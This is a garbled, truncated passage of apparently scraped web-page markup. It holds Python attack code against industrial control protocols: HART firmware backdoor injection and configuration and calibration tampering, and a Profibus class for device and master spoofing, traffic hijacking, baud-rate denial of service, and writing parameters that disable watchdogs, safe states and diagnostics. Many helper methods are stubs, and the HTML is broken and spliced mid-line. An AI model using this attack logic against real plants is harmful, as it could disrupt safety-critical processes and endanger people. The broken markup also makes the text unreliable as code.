\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003ee\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e)\n        \n        \u003cspan class=\"pl-s1\"\u003eser\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eclose\u003c/span\u003e()\n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003einjection_results\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ehart_memory_exploitation\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute HART memory manipulation attacks for device compromise.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Includes memory dumping, analysis, and modification techniques.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ememory_operations\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'memory_dump'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edump_hart_memory\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'memory_analysis'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eanalyze_hart_memory\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'memory_modification'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003emodify_hart_memory\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'configuration_extraction'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eextract_hart_configuration\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e)\n        }\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ememory_operations\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ehart_firmware_exploitation\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute comprehensive HART firmware exploitation attacks.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Includes firmware extraction, vulnerability analysis, and backdoor injection.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {}\n        \n        \u003cspan class=\"pl-c\"\u003e# Phase 1: Firmware extraction through HART commands\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003efirmware_data\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003edump_hart_firmware\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e)\n        \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'firmware_dump'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'success'\u003c/span\u003e: \u003cspan class=\"pl-en\"\u003ebool\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003efirmware_data\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'size'\u003c/span\u003e: \u003cspan class=\"pl-en\"\u003elen\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003efirmware_data\u003c/span\u003e) \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003efirmware_data\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e,\n            \u003cspan class=\"pl-s\"\u003e'crc_checksum'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ecalculate_crc\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003efirmware_data\u003c/span\u003e) \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003efirmware_data\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eNone\u003c/span\u003e\n        }\n        \n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003efirmware_data\u003c/span\u003e:\n            \u003cspan class=\"pl-c\"\u003e# Phase 2: Firmware vulnerability analysis\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003evulnerabilities\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eanalyze_hart_firmware\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003efirmware_data\u003c/span\u003e)\n            \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'vulnerability_analysis'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003evulnerabilities\u003c/span\u003e\n            \n            \u003cspan class=\"pl-c\"\u003e# Phase 3: Backdoor firmware creation and deployment\u003c/span\u003e\n            \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003evulnerabilities\u003c/span\u003e:\n                \u003cspan class=\"pl-s1\"\u003ebackdoored_firmware\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003einject_firmware_backdoor\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003efirmware_data\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003evulnerabilities\u003c/span\u003e)\n                \u003cspan class=\"pl-s1\"\u003eupload_success\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eupload_hart_firmware\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003ebackdoored_firmware\u003c/span\u003e)\n                \n                \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'backdoor_injection'\u003c/span\u003e] \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n                    \u003cspan class=\"pl-s\"\u003e'success'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eupload_success\u003c/span\u003e,\n                    \u003cspan class=\"pl-s\"\u003e'backdoor_type'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eidentify_backdoor_type\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003evulnerabilities\u003c/span\u003e),\n                    \u003cspan class=\"pl-s\"\u003e'persistence_mechanism'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eestablish_persistence\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e)\n                }\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eexploitation_results\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ehart_configuration_tampering\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Execute HART device configuration tampering attacks.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Modifies critical device parameters for malicious control or disruption.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003econfiguration_attacks\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-s\"\u003e'range_manipulation'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003emanipulate_measurement_range\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'calibration_tampering'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003etamper_calibration_data\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'alert_thresholds'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003emodify_alert_thresholds\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'communication_settings'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003emanipulate_communication_settings\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e),\n            \u003cspan class=\"pl-s\"\u003e'security_settings'\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003ebypass_security_settings\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003edevice\u003c/span\u003e)\n        }\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003econfiguration_attacks\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eload_hart_command_set\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Load comprehensive HART command set for exploitation.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Includes standard, common practice, and device-specific commands.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Command structure per HART Communication Protocol Specification (HCF SPEC-13):\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Universal Commands (0-30): Mandatory for all HART devices\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Common Practice Commands (32-126): Optional but widely implemented\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        - Device-Specific Commands (128-253): Vendor/device specific\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-s1\"\u003ehart_commands\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e {\n            \u003cspan class=\"pl-c\"\u003e# Universal Commands (0-30) - HART Spec HCF SPEC-13\u003c/span\u003e\n            \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Read Primary Variable'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Read Loop Current'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Read Dynamic Variables'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e3\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Read Device Variables'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e6\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Write Primary Variable'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e7\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Write Device Variables'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e11\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Read Unique Identifier'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e12\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Read Message'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e13\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Write Message'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e14\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Read Tag'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e15\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Write Tag'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e16\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Read Descriptor'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e17\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Write Descriptor'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e18\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Read Date'\u003c/span\u003e,\n            \n            \u003cspan class=\"pl-c\"\u003e# Common Practice Commands (32-126)\u003c/span\u003e\n            \u003cspan class=\"pl-c1\"\u003e33\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Read Primary Variable Transducer Info'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e34\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Write Primary Variable Transducer Info'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e35\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Read Device Information'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e38\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Reset Configuration Changed Flag'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e48\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Reset Device'\u003c/span\u003e,\n            \n            \u003cspan class=\"pl-c\"\u003e# Device-Specific Commands (128-253)\u003c/span\u003e\n            \u003cspan class=\"pl-c1\"\u003e128\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Read Additional Device Status'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e129\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Write Device Calibration'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e130\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Read Firmware Version'\u003c/span\u003e,\n            \u003cspan class=\"pl-c1\"\u003e131\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'Write Firmware Update'\u003c/span\u003e\n        }\n        \n        \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ehart_commands\u003c/span\u003e\n\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003everify_command_success\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Verify HART command success based on response data and status bytes.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        Analyzes response frame for command completion status and error codes.\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        \"\"\"\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003enot\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eor\u003c/span\u003e \u003cspan class=\"pl-en\"\u003elen\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e) \u003cspan class=\"pl-c1\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e:\n            \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eFalse\u003c/span\u003e\n        \n        \u003cspan class=\"pl-c\"\u003e# HART response format: Preamble, Delimiter, Address, Command, Byte Count, Data, Status, Checksum\u003c/span\u003e\n        \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-en\"\u003elen\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e) \u003cspan class=\"pl-c1\"\u003e\u0026gt;=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e5\u003c/span\u003e:\n            \u003cspan class=\"pl-c\"\u003e# Check response status byte (typically byte 4 or 5 depending on frame format)\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003estatus_byte\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e4\u003c/span\u003e] \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-en\"\u003elen\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e) \u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e4\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eelse\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eresponse\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e]\n            \n            \u003cspan class=\"pl-c\"\u003e# Status byte bitmask analysis\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003ecommunication_error\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e (\u003cspan class=\"pl-s1\"\u003estatus_byte\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0x80\u003c/span\u003e) \u003cspan class=\"pl-c1\"\u003e!=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# Bit 7: Communication error\u003c/span\u003e\n            \u003cspan class=\"pl-s1\"\u003edevice_error\u003c/span\u003e class=\"pl-c1\"\u003enot\u003c/span\u003e (\u003cspan class=\"pl-s1\"\u003ecommunication_error\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eor\u003c/span\u003e \u003cspan notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"class ProfibusExploitation:\n    def __init__(self):\n        \u0026quot;\u0026quot;\u0026quot;\n        CRITICAL INDUSTRIAL PROTOCOL SECURITY NOTICE: This class demonstrates Profibus DP\n        protocol exploitation for authorized industrial control system security testing ONLY.\n        \n        AUTHORIZED USE CASES:\n        - Profibus network security assessment in isolated test environments\n        - Industrial control system protocol vulnerability research\n        - Red team exercises with proper authorization and oversight\n        - Defensive monitoring and intrusion detection system development\n        \n        STRICT PROHIBITIONS:\n        - NEVER use on operational production systems\n        - Do not interfere with safety-critical process control\n        - Avoid disruption of manufacturing or process operations\n        - Comply with all industrial safety and operational standards\n        \n        INDUSTRY STANDARDS COMPLIANCE:\n        - IEC 61158 (Industrial Communication Networks)\n        - IEC 61784 (Industrial Communication Network Profiles)\n        - PROFIBUS DP Specification (EN 50170)\n        - NIST SP 800-82 (Industrial Control System Security)\n        \u0026quot;\u0026quot;\u0026quot;\n        self.profibus_states = {}\n        self.network_topology = {}\n        self.device_profiles = self.load_profibus_device_profiles()\n\n    def profibus_device_spoofing(self, target_network):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute comprehensive Profibus DP device spoofing attack.\n        Scans network, extracts device identities, creates spoofed devices, and hijacks communications.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Phase 1: Network reconnaissance and device discovery\n        devices = self.scan_profibus_network(target_network)\n        spoofing_results = {}\n        \n        for device in devices:\n            # Phase 2: Device identity extraction and analysis\n            identity = self.extract_profibus_identity(device)\n            \n            # Phase 3: Create malicious spoofed device with modified parameters\n            spoofed_device = self.create_profibus_spoof(identity)\n            \n            # Phase 4: Announce spoofed device on Profibus network\n            announcement_success = self.announce_profibus_device(spoofed_device)\n            \n            # Phase 5: Hijack communications to redirect traffic\n            if announcement_success:\n                hijack_success = self.hijack_profibus_communication(device, spoofed_device)\n                spoofing_results[device['address']] = {\n                    'original_device': identity,\n                    'spoofed_device': spoofed_device,\n                    'announcement_success': announcement_success,\n                    'hijack_success': hijack_success\n                }\n        \n        return spoofing_results\n\n    def profibus_parameter_manipulation(self, target_device):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute Profibus DP parameter manipulation attacks.\n        Modifies critical device parameters to disable safety features and enable malicious behavior.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Critical parameters to manipulate for attack persistence\n        malicious_parameters = {\n            'watchdog_time': 0xFFFF,      # Disable watchdog timer monitoring\n            'safe_state': 0x0000,         # Disable automatic safe state transition\n            'process_data': 0xDEAD,       # Inject malicious process data pattern\n            'diagnostic_interval': 0x0000, # Disable diagnostic reporting\n            'baud_rate': 0x0C00,          # Manipulate communication speed\n            'slot_time': 0xFFFF,          # Maximum slot time for timing attacks\n        }\n        \n        manipulation_results = {}\n        \n        for param, value in malicious_parameters.items():\n            write_success = self.write_profibus_parameter(target_device, param, value)\n            verification = self.verify_parameter_change(target_device, param, value)\n            \n            manipulation_results[param] = {\n                'write_success': write_success,\n                'verification': verification,\n                'original_value': self.read_original_parameter(target_device, param),\n                'new_value': value\n            }\n        \n        return manipulation_results\n\n    def profibus_baud_rate_attack(self, target_network):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute Profibus baud rate manipulation attack.\n        Changes network communication speed to cause desynchronization and denial of service.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Discover current network baud rate\n        current_baud = self.detect_profibus_baud_rate(target_network)\n        \n        # Malicious baud rates to disrupt communication\n        disruptive_bauds = [9300, 187500, 1500000, 3000000, 6000000, 12000000]\n        \n        attack_results = {}\n        \n        for malicious_baud in disruptive_bauds:\n            if malicious_baud != current_baud:\n                change_success = self.set_profibus_baud_rate(target_network, malicious_baud)\n                disruption_level = self.assess_communication_disruption(target_network)\n                \n                attack_results[malicious_baud] = {\n                    'change_success': change_success,\n                    'original_baud': current_baud,\n                    'disruption_level': disruption_level,\n                    'recovery_required': disruption_level \u0026gt; 0.5\n                }\n        \n        return attack_results\n\n    def profibus_master_spoofing(self, target_network):\n        \u0026quot;\u0026quot;\u0026quot;\n        Execute Profibus master station spoofing attack.\n        Impersonates the Profibus DP master to take control of network communications.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Identify legitimate master station\n        legitimate_master = self.identify_profibus_master(target_network)\n        \n        # Extract master identity and parameters\n        master_identity = self.extract_master_identity(legitimate_master)\n        \n        # Create spoofed master with enhanced privileges\n        spoofed_master = self.create_master_spoof(master_identity)\n        \n        # Take over master functionality\n        takeover_results = {\n            'token_capture': self.capture_profibus_token(),\n            'slave_enumeration': self.enumerate_slaves_as_master(),\n            'parameter_control': self.control_slave_parameters(),\n            'data_exchange_hijack': self.hijack_data_exchange()\n        }\n        \n        return takeover_results\n\n    def scan_profibus_network(self, target_network):\n        \u0026quot;\u0026quot;\u0026quot;\n        Comprehensive Profibus network scanning and device enumeration.\n        Identifies all active devices, their addresses, and basic characteristics.\n        \u0026quot;\u0026quot;\u0026quot;\n        print(f\u0026quot;[*] Scanning Profibus network: {target_network}\u0026quot;)\n        discovered_devices = []\n        \n        # Scan standard Profibus DP address range (0-125)\n        for address in range(0, 126):\n            device_info = self.probe_profibus_device(address)\n            if device_info:\n                discovered_devices.append(device_info)\n                print(f\u0026quot;[+] Discovered Profibus device: Address {address}, Type: {device_info.get('device_type', 'Unknown')}\u0026quot;)\n        \n        # Build network topology map\n        self.network_topology = self.build_topology_map(discovered_devices)\n        \n        return discovered_devices\n\n    def extract_profibus_identity(self, device):\n        \u0026quot;\u0026quot;\u0026quot;\n        Extract complete device identity for spoofing purposes.\n        Gathers device identification, parameters, and operational characteristics.\n        \u0026quot;\u0026quot;\u0026quot;\n        identity = {\n            'device_address': device['address'],\n            'device_type': device.get('device_type'),\n            'manufacturer_id': self.read_device_manufacturer(device),\n            'device_id': self.read_device_identification(device),\n            'device_profile': self.read_device_profile(device),\n            'parameters': self.read_all_device_parameters(device),\n            'diagnostic_capabilities': self.read_diagnostic_capabilities(device)\n        }\n        \n        return identity\n\n    def create_profibus_spoof(self, original_identity):\n        \u0026quot;\u0026quot;\u0026quot;\n        Create malicious spoofed device based on original device identity.\n        Modifies parameters to enable attack capabilities while maintaining appearance.\n        \u0026quot;\u0026quot;\u0026quot;\n        spoofed_identity = original_identity.copy()\n        \n        # Modify parameters for malicious functionality\n        spoofed_identity.update({\n            'malicious_modifications': {\n                'watchdog_disabled': True,\n                'safe_state_override': True,\n                'diagnostic_suppression': True,\n                'backdoor_enabled': True\n            },\n            'modified_parameters': {\n                'watchdog_time': 0xFFFF,\n                'safe_state': 0x0000,\n                'diagnostic_interval': 0x0000\n            },\n            'spoofed_address': self.calculate_spoof_address(original_identity['device_address']),\n            'attack_capabilities': ['parameter_manipulation', 'data_injection', 'communication_hijack']\n        })\n        \n        return spoofed_identity\n\n    def hijack_profibus_communication(self, original_device, spoofed_device):\n        \u0026quot;\u0026quot;\u0026quot;\n        Hijack Profibus communications by redirecting traffic to spoofed device.\n        Implements man-in-the-middle between master and original device.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Redirect master communications to spoofed device\n        redirection_success = self.redirect_master_communications(\n            original_device['device_address'], \n            spoofed_device['spoofed_address']\n        )\n        \n        # Intercept and modify process data\n        interception_capability = self.enable_process_data_interception(\n            original_device['device_address']\n        )\n        \n        # Establish persistent communication control\n        persistence = self.establish_communication_persistence(\n            spoofed_device['spoofed_address']\n        )\n        \n        return {\n            'redirection_success': redirection_success,\n            'interception_capability': interception_capability,\n            'persistence_established': persistence\n        }\n\n    def write_profibus_parameter(self, target_device, parameter, value):\n        \u0026quot;\u0026quot;\u0026quot;\n        Write malicious parameter value to target Profibus device.\n        Bypasses parameter validation and safety checks.\n        \u0026quot;\u0026quot;\u0026quot;\n        # Bypass parameter validation mechanisms\n        validation_bypass = self.bypass_parameter_validation(target_device, parameter)\n        \n        if validation_bypass:\n            # Write malicious parameter value\n            write_success = self.raw_parameter_write(target_device, parameter, value)\n            \n            # Verify parameter change persistence\n            persistence = self.verify_parameter_persistence(target_device, parameter, value)\n            \n            return write_success and persistence\n        \n        return False\n\n    # Additional helper methods would be implemented here...\n    def load_profibus_device_profiles(self):\n        \u0026quot;\u0026quot;\u0026quot;Load known Profibus device profiles for accurate spoofing\u0026quot;\u0026quot;\u0026quot;\n        return {\n            'drive_profiles': ['AC_Drive', 'DC_Drive', 'Servo_Drive'],\n            'io_profiles': ['Digital_IO', 'Analog_IO', 'Special_Function'],\n            'sensor_profiles': ['Temperature', 'Pressure', 'Flow', 'Level'],\n            'controller_profiles': ['PLC', 'DCS', 'PAC']\n        }\n\n    def build_topology_map(self, devices):\n        \u0026quot;\u0026quot;\u0026quot;Build comprehensive Profibus network topology map\u0026quot;\u0026quot;\u0026quot;\n        topology = {\n            'master_station': None,\n            'slave_devices': [],\n            'network_parameters': {},\n            'communication_relationships': {}\n        }\n        \n        for device in devices:\n            if device.get('is_master', False):\n                topology['master_station'] = device\n            else:\n                topology['slave_devices'].append(device)\n        \n        return topology\n\n    def calculate_spoof_address(self, original_address):\n        \u0026quot;\u0026quot;\u0026quot;Calculate optimal spoof address to avoid conflicts\u0026quot;\u0026quot;\u0026quot;\n        return (original_address + 64) % 126  # Simple offset calculation\n        ```\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003eclass\u003c/span\u003e \u003cspan class=\"pl-v\"\u003eProfibusExploitation\u003c/span\u003e:\n    \u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003e__init__\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eself\u003c/span\u003e):\n        \u003cspan class=\"pl-s\"\u003e\"\"\"\u003c/span\u003e\n\u003cspan class=\"pl-s\"\u003e        